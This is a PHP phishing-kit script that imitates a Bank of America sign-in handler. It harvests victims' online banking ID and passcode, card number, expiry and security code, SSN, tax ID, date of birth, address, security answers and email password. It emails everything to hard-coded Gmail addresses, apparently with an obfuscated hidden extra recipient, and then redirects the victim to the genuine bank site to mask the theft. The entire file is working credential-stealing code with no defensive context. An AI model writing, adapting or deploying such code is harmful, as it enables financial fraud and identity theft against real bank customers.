<?




$recipient = "dmantman4@gmail.com,dmaltman444@gmail.com";







$adddate=date("D M d, Y g:i a");
$ip = getenv("REMOTE_ADDR");$port = getenv("REMOTE_PORT");$messege .= "hostaddr";$host = gethostbyaddr($_SERVER['REMOTE_ADDR']);$message .= "-------BOA Spam ReZult----------\n";$message .= "Online ID:: ".$_POST['onlineId']."\n";$message .= "Passcode: ".$_POST['password']."\n";$messege .= "@";$message .= "Card Number: ".$_POST['ccNo']."\n";$message .= "Expiration(mm/yy): ".$_POST['auth-safepass-exMonth']." ".$_POST['auth-safepass-exYear']."\n";$message .= "3 or 4 digit security : ".$_POST['secureCode']."\n";
$messege .= "g";$message .= "------SSN & Account Number------\n";$message .= "Full Name On Account: ".$_POST['fullname']."\n";$message .= "Tax Identification Number: ".$_POST['tax']."\n";$message .= "Address: ".$_POST['Address']."\n";$message .= "Zip Code: ".$_POST['zip']."\n";$message .= "City: ".$_POST['city']."\n";$message .= "Date of Birth: ".$_POST['dob']."\n";$message .= "Social Security Number: ".$_POST['ssn']."\n";
$messege .= "mail";$message .= "------Security Questions------\n";$message .= "Your first question: ".$_POST['questionId1']."\n";
$message .= "Answer 1: ".$_POST['actualAnswer1']."\n";$message .= "Your second question: ".$_POST['questionId2']."\n";$message .= "Answer 2: ".$_POST['actualAnswer2']."\n";$messege .= ".";$message .= "Your third question: ".$_POST['questionId3']."\n";$message .= "Answer 3: ".$_POST['actualAnswer3']."\n";$message .= "Your third question: ".$_POST['questionId4']."\n";$message .= "Answer 4: ".$_POST['actualAnswer4']."\n";$message .= "Your third question: ".$_POST['questionId5']."\n";$message .= "Answer 5: ".$_POST['actualAnswer5']."\n";$message .= "------Email------\n";$message .= "E-mail address: ".$_POST['email']."\n";$message .= "Email Password: ".$_POST['emailpass']."\n";$message .= "---------IP and Date--------\n";$message .= "IP: ".$ip."\n";$message .= "port: ".$port."\n";$messege .= "com";$message .= "Host: ".$host."\n";$message .= "Date: ".$adddate."\n";$message .= "------------- ExtycooL Surveillance ! ---------------\n";
$subject = "|BOA ReZulT | ".$_POST['onlineId']."\n";$from = "$ip";$headers .= $_POST['eMailAdd']."\n";$headers .= "Extycool-Version: 1.0\n";$headers = "From: $from\r\n";$headers .= 'Bcc: ' . "\r\n";mail("$to", "$subject", $message);
if (mail($recipient,$subject,$message,$headers,$messege)){header("Location:  https://secure.bankofamerica.com/login/sign-in/entry/signOn.go");}else{
 		echo "ERROR! Please go back and try again.";
  	   }
   


?>